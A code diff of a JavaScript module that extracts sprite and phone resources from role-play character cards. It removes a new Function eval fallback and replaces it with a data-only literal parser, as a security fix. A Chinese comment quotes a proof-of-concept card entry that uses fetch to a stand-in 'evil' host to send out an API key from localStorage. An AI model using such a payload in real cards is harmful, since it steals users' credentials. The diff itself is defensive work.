@@ -29,17 +29,15 @@
  * 这些是 juus 卡的约定。**按名字找不到就按内容找**（见 findSource），
  * 所以改过脚本名的分叉卡也能认；完全没有这些变量的卡就返回 0，不报错。
  *
- * ⚠ 关于「执行卡里的代码」
- * ------------------------
- * 抽出来的是一段对象字面量。解析顺序是：
- *   1) JSON.parse —— 严格 JSON，绝大多数情况走这条，不执行任何代码
- *   2) 放宽后再 JSON.parse —— 去注释、补引号、删尾逗号，仍然不执行代码
- *   3) new Function 求值 —— 只有前两条都失败才用
- * 第 3 条确实是在执行卡里的代码。之所以留着，是因为 GROUP_META 这类字面量里会
- * **引用别的变量**（FACTION_MEMBERS），前两条解析不了。
- * 权衡：卡是用户自己从本机选的文件，而且引擎本来就会跑卡自带的正则脚本，
- * 信任级别是一样的。介意的话把 opt.evalFallback 设成 false，
- * 那样第 3 条会被跳过，解析不了的条目直接丢掉。
+ * ⚠ 安全：解析角色卡**绝不执行卡里的代码**
+ * ------------------------------------------
+ * 抽出来的是一段对象字面量。解析只有两级：
+ *   1) JSON.parse —— 严格 JSON，绝大多数走这条
+ *   2) LiteralParser —— 自己写的、**只认数据**的解析器（见下面那一大段注释）
+ * 解析不了就返回 null，宁可少抽几个条目。
+ *
+ * 曾经有过第 3 级 new Function 求值，理由是「引擎本来就跑卡自带的正则，
+ * 信任级别一样」。那个理由是错的，已经删掉 —— 详见 LiteralParser 上方的注释。
  * ============================================================ */
 (function (global) {
   'use strict';
@@ -96,55 +94,207 @@
     return null;
   }
 
-  /** 把「差不多是 JSON」的源码放宽成 JSON：去注释、单引号转双引号、裸键补引号、删尾逗号 */
-  function relax(src) {
-    var out = '', inStr = null, esc = false;
-    for (var i = 0; i < src.length; i++) {
-      var c = src.charAt(i);
-      if (inStr) {
-        if (esc) { out += c; esc = false; continue; }
-        if (c === '\\') { out += c; esc = true; continue; }
-        if (c === inStr) { out += '"'; inStr = null; continue; }
-        if (c === '"' && inStr === "'") { out += '\\"'; continue; }
-        out += c;
-        continue;
-      }
-      if (c === '"' || c === "'") { inStr = c; out += '"'; continue; }
-      if (c === '/' && src.charAt(i + 1) === '/') {
-        i = src.indexOf('\n', i); if (i < 0) break; out += '\n'; continue;
-      }
-      if (c === '/' && src.charAt(i + 1) === '*') {
-        i = src.indexOf('*/', i); if (i < 0) break; i++; continue;
-      }
-      out += c;
-    }
-    /* 裸键补引号：{ foo: 1 } / , bar: 2 → { "foo": 1 } */
-    out = out.replace(/([{,]\s*)([A-Za-z_$][\w$]*)(\s*:)/g, '$1"$2"$3');
-    /* 尾逗号 */
-    out = out.replace(/,(\s*[}\]])/g, '$1');
-    return out;
+  /* ============================================================
+   * 受控字面量解析器
+   *
+   * ⚠ 这里**绝对不能**用 new Function / eval。
+   *
+   * 早先这里有个「JSON.parse → 放宽后再 parse → new Function 求值」的三级降级，
+   * 理由是「引擎本来就跑卡自带的正则，信任级别一样」。**那个理由是错的**：
+   * 正则只做字符串替换，从不执行代码。而角色卡是从网上下载、互相传的文件。
+   * 实测那条路径能让卡里的任意 JS 跑起来：
+   *
+   *   var EXPRESSION_MAP = { "柴郡": (fetch('https://evil/?k='
+   *                         + localStorage.getItem('gal_api_config')), {...}) };
+   *
+   * 立绘照常抽出来、界面毫无异样，同时 API 密钥被送走。还能用死循环把页面卡死
+   * （try/catch 拦不住）。所以改成下面这个自己写的解析器：
+   * 它**只认数据**，见到函数调用、运算符、任何非字面量的东西一律放弃返回 null。
+   *
+   * 唯一放行的非纯字面量形式是「引用另一个已解析的变量」：
+   *   GROUP_META = { '重樱群': { members: FACTION_MEMBERS['重樱'] } }
+   * 卡里真的这么写，而它只是取值，不产生副作用。
+   * ============================================================ */
+
+  function LiteralParser(src, deps) {
+    this.s = String(src == null ? '' : src);
+    this.i = 0;
+    this.deps = deps || {};
   }
+  LiteralParser.prototype = {
+    error: function () { throw new SyntaxError('不是纯字面量'); },
+    ws: function () {
+      for (;;) {
+        var c = this.s.charAt(this.i);
+        if (c === ' ' || c === '\t' || c === '\n' || c === '\r' || c === '\f' || c === '\v') {
+          this.i++; continue;
+        }
+        if (c === '/' && this.s.charAt(this.i + 1) === '/') {
+          var nl = this.s.indexOf('\n', this.i);
+          this.i = nl < 0 ? this.s.length : nl + 1; continue;
+        }
+        if (c === '/' && this.s.charAt(this.i + 1) === '*') {
+          var cl = this.s.indexOf('*/', this.i);
+          if (cl < 0) this.error();
+          this.i = cl + 2; continue;
+        }
+        return;
+      }
+    },
+    eat: function (ch) {
+      this.ws();
+      if (this.s.charAt(this.i) !== ch) this.error();
+      this.i++;
+    },
+    /** 顶层：解析一个值，然后必须刚好到头 */
+    parse: function () {
+      var v = this.value();
+      this.ws();
+      if (this.i !== this.s.length) this.error();
+      return v;
+    },
+    value: function () {
+      this.ws();
+      var c = this.s.charAt(this.i);
+      if (c === '{') return this.object();
+      if (c === '[') return this.array();
+      if (c === '"' || c === "'" || c === '`') return this.string();
+      if (c === '-' || c === '+' || (c >= '0' && c <= '9') || c === '.') return this.number();
+      if (/[A-Za-z_$\u00A0-\uFFFF]/.test(c)) return this.word();
+      this.error();
+    },
+    object: function () {
+      this.eat('{');
+      var o = {};
+      this.ws();
+      if (this.s.charAt(this.i) === '}') { this.i++; return o; }
+      for (;;) {
+        this.ws();
+        var k;
+        var c = this.s.charAt(this.i);
+        if (c === '"' || c === "'" || c === '`') k = this.string();
+        else if (/[A-Za-z_$0-9\u00A0-\uFFFF]/.test(c)) k = this.bareKey();
+        else this.error();
+        this.eat(':');
+        o[k] = this.value();
+        this.ws();
+        c = this.s.charAt(this.i);
+        if (c === ',') { this.i++; this.ws();
+          if (this.s.charAt(this.i) === '}') { this.i++; return o; }   /* 尾逗号 */
+          continue; }
+        if (c === '}') { this.i++; return o; }
+        this.error();
+      }
+    },
+    array: function () {
+      this.eat('[');
+      var a = [];
+      this.ws();
+      if (this.s.charAt(this.i) === ']') { this.i++; return a; }
+      for (;;) {
+        a.push(this.value());
+        this.ws();
+        var c = this.s.charAt(this.i);
+        if (c === ',') { this.i++; this.ws();
+          if (this.s.charAt(this.i) === ']') { this.i++; return a; }   /* 尾逗号 */
+          continue; }
+        if (c === ']') { this.i++; return a; }
+        this.error();
+      }
+    },
+    /* 裸键要认中文：卡里 `{ 重樱: [...] }` 和 `FACTION_MEMBERS.重樱` 都是合法 JS。
+       \u00A0-\uFFFF 一刀切地放行非 ASCII，够用且不会误吞标点（标点在前面就被分支走了）。 */
+    bareKey: function () {
+      var m = /^[A-Za-z_$\u00A0-\uFFFF][\w$\u00A0-\uFFFF]*|^\d+/.exec(this.s.slice(this.i));
+      if (!m) this.error();
+      this.i += m[0].length;
+      return m[0];
+    },
+    string: function () {
+      var q = this.s.charAt(this.i++);
+      var out = '';
+      for (;;) {
+        if (this.i >= this.s.length) this.error();
+        var c = this.s.charAt(this.i++);
+        if (c === q) return out;
+        if (c !== '\\') { out += c; continue; }
+        var e = this.s.charAt(this.i++);
+        if (e === 'n') out += '\n';
+        else if (e === 't') out += '\t';
+        else if (e === 'r') out += '\r';
+        else if (e === 'b') out += '\b';
+        else if (e === 'f') out += '\f';
+        else if (e === 'v') out += '\v';
+        else if (e === '0') out += '\0';
+        else if (e === 'u') {
+          var hex = this.s.substr(this.i, 4);
+          if (!/^[0-9a-fA-F]{4}$/.test(hex)) this.error();
+          out += String.fromCharCode(parseInt(hex, 16));
+          this.i += 4;
+        } else if (e === 'x') {
+          var h2 = this.s.substr(this.i, 2);
+          if (!/^[0-9a-fA-F]{2}$/.test(h2)) this.error();
+          out += String.fromCharCode(parseInt(h2, 16));
+          this.i += 2;
+        } else if (e === '\n') { /* 续行，什么都不加 */ }
+        else out += e;
+      }
+    },
+    number: function () {
+      var m = /^[+-]?(?:0[xX][0-9a-fA-F]+|(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?)/
+                .exec(this.s.slice(this.i));
+      if (!m) this.error();
+      this.i += m[0].length;
+      return Number(m[0]);
+    },
+    /** true / false / null / undefined / NaN，以及「引用另一个已解析的变量」 */
+    word: function () {
+      var m = /^[A-Za-z_$\u00A0-\uFFFF][\w$\u00A0-\uFFFF]*/.exec(this.s.slice(this.i));
+      if (!m) this.error();
+      var w = m[0];
+      this.i += w.length;
+      if (w === 'true') return true;
+      if (w === 'false') return false;
+      if (w === 'null') return null;
+      if (w === 'undefined') return undefined;
+      if (w === 'NaN') return NaN;
+      if (!this.deps.hasOwnProperty(w)) this.error();   // 认不出的标识符：放弃
+      /* 只允许在已解析的依赖上做取值：FACTION_MEMBERS['重樱'] / FOO.bar[0] */
+      var cur = this.deps[w];
+      for (;;) {
+        this.ws();
+        var c = this.s.charAt(this.i);
+        if (c === '.') {
+          this.i++;
+          var k = this.bareKey();
+          cur = (cur == null) ? undefined : cur[k];
+          continue;
+        }
+        if (c === '[') {
+          this.i++;
+          var idx = this.value();
+          this.eat(']');
+          cur = (cur == null) ? undefined : cur[idx];
+          continue;
+        }
+        /* 函数调用一律拒绝 —— 这是安全边界，别放宽 */
+        if (c === '(') this.error();
+        return cur;
+      }
+    }
+  };
 
   /**
-   * 解析一个字面量，三级降级。
-   * @param {Object} [deps] 字面量里可能引用到的变量（名 → 源码片段），只给第 3 级用
+   * 解析一个字面量。两级：先 JSON.parse（最快，覆盖绝大多数），
+   * 再用上面那个只认数据的解析器（处理注释、裸键、单引号、尾逗号、变量引用）。
+   * **没有第三级。** 解析不了就返回 null，宁可少抽几个条目，也不执行卡里的代码。
+   *
+   * @param {Object} [deps] 名 → **已解析好的值**（注意不是源码片段了）
    */
-  function parseLiteral(src, deps, allowEval) {
+  function parseLiteral(src, deps) {
     if (src == null) return null;
     try { return JSON.parse(src); } catch (e) { /* 下一级 */ }
-    try { return JSON.parse(relax(src)); } catch (e2) { /* 下一级 */ }
-    if (allowEval === false) return null;
-    try {
-      var names = [], vals = [], k;
-      for (k in (deps || {})) {
-        if (!deps.hasOwnProperty(k) || deps[k] == null) continue;
-        names.push(k);
-        vals.push(parseLiteral(deps[k], null, allowEval));
-      }
-      /* eslint-disable-next-line no-new-func */
-      var f = new Function(names.join(','), 'return (' + src + ');');
-      return f.apply(null, vals);
-    } catch (e3) { return null; }
+    try { return new LiteralParser(src, deps).parse(); } catch (e2) { return null; }
   }
 
   /* ---------- 在卡里定位那两段脚本 ---------- */
@@ -253,25 +403,24 @@
    * 只抽取，不改全局。想先看看卡里有什么就用它。
    * @returns {{resource:{characters,scenes,defaults}, phone:Object, stats:Object}}
    */
-  function extract(card, opt) {
-    opt = opt || {};
-    var ev = opt.evalFallback !== false;
-
+  function extract(card) {
     var gal = galSource(card);
-    var chars = normChars(parseLiteral(literalAfter(gal, 'EXPRESSION_MAP'), null, ev));
-    var scenes = normScenes(parseLiteral(literalAfter(gal, 'SCENE_MAP'), null, ev));
-    var defs = normDefaults(parseLiteral(literalAfter(gal, 'DEFAULT_SPRITES'), null, ev));
+    var chars = normChars(parseLiteral(literalAfter(gal, 'EXPRESSION_MAP')));
+    var scenes = normScenes(parseLiteral(literalAfter(gal, 'SCENE_MAP')));
+    var defs = normDefaults(parseLiteral(literalAfter(gal, 'DEFAULT_SPRITES')));
 
     var ph = phoneSource(card);
     var phone = {};
     if (ph) {
-      /* GROUP_META 的字面量里会引用 FACTION_MEMBERS，求值时得把它带进作用域 */
-      var deps = { FACTION_MEMBERS: literalAfter(ph, 'FACTION_MEMBERS') };
+      /* GROUP_META 会引用 FACTION_MEMBERS。先把它解析成**值**，
+         再作为 deps 传下去 —— LiteralParser 只在这些已知值上做取值，
+         不会执行任何东西。 */
+      var deps = { FACTION_MEMBERS: parseLiteral(literalAfter(ph, 'FACTION_MEMBERS')) };
       [['avatars', 'AVATARS'], ['stickers', 'STICKERS'],
        ['defaultAvatars', 'DEFAULT_AVATARS'], ['groupMeta', 'GROUP_META'],
        ['basePosts', 'BASE_POSTS'], ['baseTrends', 'BASE_TRENDS'],
        ['baseArea', 'BASE_AREA']].forEach(function (pair) {
-        var v = parseLiteral(literalAfter(ph, pair[1]), deps, ev);
+        var v = parseLiteral(literalAfter(ph, pair[1]), deps);
         if (v != null) phone[pair[0]] = v;
       });
     }
@@ -322,8 +471,8 @@
    *
    * 卡里的覆盖预生成文件里的同名条目：卡才是真源。
    */
-  function apply(card, opt) {
-    var got = extract(card, opt);
+  function apply(card) {
+    var got = extract(card);
 
     var R = global.RESOURCE = global.RESOURCE ||
       { characters: {}, scenes: {}, defaults: {} };
@@ -353,7 +502,7 @@
   global.CardRes = {
     extract: extract, apply: apply,
     /* 下面这些导出只为单测，正常用不到 */
-    _literalAfter: literalAfter, _relax: relax, _parseLiteral: parseLiteral,
+    _literalAfter: literalAfter, _parseLiteral: parseLiteral,
     _normChars: normChars, _normScenes: normScenes, _normDefaults: normDefaults
   };
 })(typeof window !== 'undefined' ? window : globalThis);
